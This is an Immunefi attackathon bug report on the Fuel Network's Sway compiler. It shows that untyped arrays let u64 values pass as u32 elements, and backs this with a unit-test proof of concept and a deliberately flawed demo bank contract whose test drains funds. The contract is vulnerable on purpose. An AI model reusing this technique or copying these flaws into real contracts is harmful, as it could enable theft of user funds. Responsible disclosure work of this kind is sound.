# Attackathon \_ Fuel Network 32849 - \[Smart Contract - Low] Insufficient array construction element ty

Submitted on Thu Jul 04 2024 20:56:08 GMT-0400 (Atlantic Standard Time) by @anatomist for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32849

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/FuelLabs/sway/tree/7b56ec734d4a4fda550313d448f7f20dba818b59>

Impacts:

* Incorrect sway compilation leading to incorrect bytecode
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A faulty check in array element types can allow illegal values in array.

## Vulnerability Details

Arrays in sway are required to use a single type for all elements. This is checked in `type_check_array`, and the compiler should error out if any of the elements are of different types. Because we allow type inference, it is possible the type of array elements is not provided on declaration. If element type is not provided, it will be taken from the first element of the array. However, the type inference is done after the type check, so if the array type is not provided, the check will not be enforced.

```
fn type_check_array(
    handler: &Handler,
    mut ctx: TypeCheckContext,
    contents: &[Expression],
    span: Span,
) -> Result<Self, ErrorEmitted> {
    ...

    // start each element with the known array element type, or Unknown if it is to be inferred
    // from the elements
    let initial_type = match &*ctx.engines().te().get(ctx.type_annotation()) {
        TypeInfo::Array(element_type, _) => {
            (*ctx.engines().te().get(element_type.type_id)).clone()
        }
        _ => TypeInfo::Unknown,
    };

    let typed_contents: Vec<ty::TyExpression> = contents
        .iter()
        .map(|expr| {
            let span = expr.span();
            let ctx = ctx
                .by_ref()
                .with_help_text("")
                .with_type_annotation(type_engine.insert(engines, initial_type.clone(), None));
            Self::type_check(handler, ctx, expr)
                .unwrap_or_else(|err| ty::TyExpression::error(err, span, engines))
        })
        .collect();

    let elem_type = typed_contents[0].return_type;
    ...
}
```

In most cases, different element types will be caught later and cause an ICE, but if the types are `u16`, `u32` and `u64`, then they will not be caught. Instead, all values are stored as 64 bit wide elements. So if we create an untyped array with a `u32` as the first element, but pass a `u64` as one of other elements, the array will just store the `u64` value and treat it as a `u32`. This creates a `u32` value greater than `u32::max`. This is clearly not acceptable.

## Impact Details

Creating variables that exceed the max possible value case can cause unpredictable execution results. The exact impact is hard to estimate because it depends on how the affected contract is written, but loss of funds or bricking of contracts are both possible.

## References

* `https://github.com/FuelLabs/sway/blob/fc2a90b78eb72d97e19100c93ca80c9a2892563c/sway-core/src/semantic_analysis/ast_node/expression/typed_expression.rs#L1832`

## Proof of concept

## Proof of Concept

Tests are run on sway commit `014e1815de192aedc8c61f5fbbd74bbdfbd7c92a`.

The `u64` is inserted into the array without checking the data width, and can result in creation of a `u32` that exceeds `u32::max`.

```
script;

fn main() -> () {
    ()
}

fn insufficient_type_check(arg: u64) -> [u32;2] {
    let res = [1u32, arg];
    res
}

#[test]
fn test() -> () {
    let a = 4294967296;
    let res = insufficient_type_check(a);
    assert(res[1] <= u32::max());
    ()
}
```

We also provide a hypothetical dapp to show how this can lead to loss of funds. To run this as a unit test with `forc test`, you need to modify the test cli command to provide more input coins, the default is 1.

By the way, please check our other closed reports. They contain other incorrect compilation bugs, but we didn't add the loss of funds in scope impact previously, so they were closed as out of scope. I can write similar dapps with minor changes to withdraw and deposit function to demonstrate loss of funds for all of those reports, but I don't think this adds much value to what I already wrote, and will take a lot of time.

```
contract;
use std::hash::sha256;
use std::hash::Hash;
use std::storage::storage_api::{read, write};
use std::{
    call_frames::msg_asset_id,
    context::msg_amount,
    asset::transfer,
    bytes::Bytes,
    flags::{
        disable_panic_on_overflow,
        enable_panic_on_overflow,
    },
    block::{
        block_header_hash,
        height,
    },
    primitive_conversions::{
        b256::*,
        u256::*,
    },
};

storage {
    bank: StorageMap<b256, u64> = StorageMap {},
    base_fee: u64 = 0,
    protocol_fee: u64 = 0,
    donation: u64 = 0,
}

abi Bank {
    #[payable]
    #[storage(read, write)]
    fn deposit_to(recipient: Address, amount: u64);

    #[storage(read, write)]
    fn withdraw(from: Address, to: b256, amount: u64);
}

const BASE_FEE: u32 = 1;
const PROTOCOL_FEE: u32 = 1;

impl Bank for Contract {
    #[payable]
    #[storage(read, write)]
    fn deposit_to(recipient: Address, amount: u64) {
        let amounts: [u32;3] = pack_amounts(amount);
        if (msg_asset_id() != AssetId::base()) {
            log("Not base asset");
            revert(1);
        }
        //we don't want storage slot calculation to error on the -1, which is the ethereum way to lower storage slot collisions probability
        let _ = disable_panic_on_overflow();
        let identifier = b256::from(u256::from(sha256((block_header_hash(height() - 1).unwrap(), recipient))) - 1);
        let mut total: u64 = 0;
        let mut i: u64 = 0;
        while i < 3 {
            total += amounts[i].as_u64(); //can't overflow with u32 sum
            i += 1;
        }
        if total > msg_amount() {
            log("Invalid amount");
            revert(2);
        }
        //each recipient can only deposit once per block
        if read::<bool>(identifier, 0).is_some() {
            log("Already depositted");
            revert(3);
        }
        //accumulative results can't reallistically overflow, but we still want to check against it.
        let _ = enable_panic_on_overflow();
        let base_fee = storage.base_fee.read();
        let protocol_fee = storage.protocol_fee.read();
        let donation = storage.donation.read();
        let key_for_storage: b256 = recipient.into();
        let value = storage.bank.get(key_for_storage).try_read().unwrap_or(0);

        write(identifier, 0, true);
        storage.base_fee.write(base_fee + BASE_FEE.as_u64());
        storage.protocol_fee.write(protocol_fee + PROTOCOL_FEE.as_u64());
        storage.donation.write(donation + msg_amount() - total);
        storage.bank.insert(key_for_storage, value + amount);
    }

    #[storage(read, write)]
    fn withdraw(from: Address, to: b256, amount: u64) {
        //from should be message sender to prevent arbitrary, but I don't want to 
        let key_for_storage: b256 = from.into();
        if let Some(value) = storage.bank.get(key_for_storage).try_read() {
            storage.bank.insert(key_for_storage, value - amount);
            __smo(to, "withdraw", amount);

        } else {
            log("Failed to get value from bank");
            revert(2);
        }
    }
}

fn pack_amounts<T>(amount: T) -> [u32;3] {
    let amounts = [BASE_FEE, PROTOCOL_FEE, amount];
    amounts
}

#[test]
fn _failure_to_loss_of_funds() -> () {
    const ADDRESS_ALICE = Address::from(0x0000000000000000000000000000000000000000000000000000000000000001);
    const ADDRESS_BOB   = Address::from(0x0000000000000000000000000000000000000000000000000000000000000002);

    let bank = abi(Bank, CONTRACT_ID);
    bank.deposit_to{asset_id : AssetId::base().into(), coins: 1}(ADDRESS_ALICE, 0xfffffffffffffffe);  //this should fail
    bank.deposit_to{asset_id : AssetId::base().into(), coins: 3}(ADDRESS_BOB, 1);
    bank.withdraw(ADDRESS_ALICE, 0x0000000000000000000000000000000000000000000000000000000000000010, 4); //alice steals funds
    ()
}
```
